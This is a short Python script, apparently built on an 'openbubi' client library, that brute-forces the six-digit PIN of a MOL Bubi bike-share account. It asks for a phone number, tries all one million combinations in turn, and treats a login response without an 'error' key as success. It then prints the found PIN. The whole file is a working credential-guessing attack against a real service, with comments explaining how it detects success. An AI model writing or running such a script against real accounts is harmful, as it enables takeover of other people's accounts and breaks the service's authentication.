import sys # for path manipulation
sys.path.append("../") # add openbubi.py's folder to the current path
import openbubi
import json # for converting openbubi output to dictionary
import itertools # for making an iterable object with all the six-digit numbers
import getpass # for getting input from the user without echoing

phoneNumber = getpass.getpass("Please enter a phone number: ")

# make an iterable object that contains all six-digit numbers, and iterate through that
for i in itertools.product("0123456789", repeat=6):
  # convert the elements of the current tuple to a string
  currentNum = "".join(i)
  # print currentNum out
  print(currentNum)
  # make a new BubiUser instance with the password `currentNum`
  user = openbubi.BubiUser(phoneNumber, currentNum)
  """
  Really long line, but I'll explain it.
  If there is an error while logging in, MOL Bubi returns an error code like this:

  {
  "server_time": 1635867338,
  "error": {
    "code": 1,
    "message": "A felhasználó nem található, vagy a bejelentkezés nem sikerült.",
    "reference": "61815aca3f4fe"
    }
  }

  There is a JSON object, that contains an error key with a value that contains
  another JSON object with the error code, error message, and reference.
  So, if we want to detect login failure, we need to check if there is a key named "error".
  So we need to:
  1. Convert the output of user.login() to a dictionary
  2. Convert all the keys of this dictionary into a list
  3. Check if the statement 'there is an element in that list called error' is false
  4. If that is false, then we got no errors, and the pin is correct
  """
  if ("error" in list(json.loads(user.info()).keys())) == False: # there is no error
    print(f"Match! The pin is {currentNum}")
    quit() # quit the program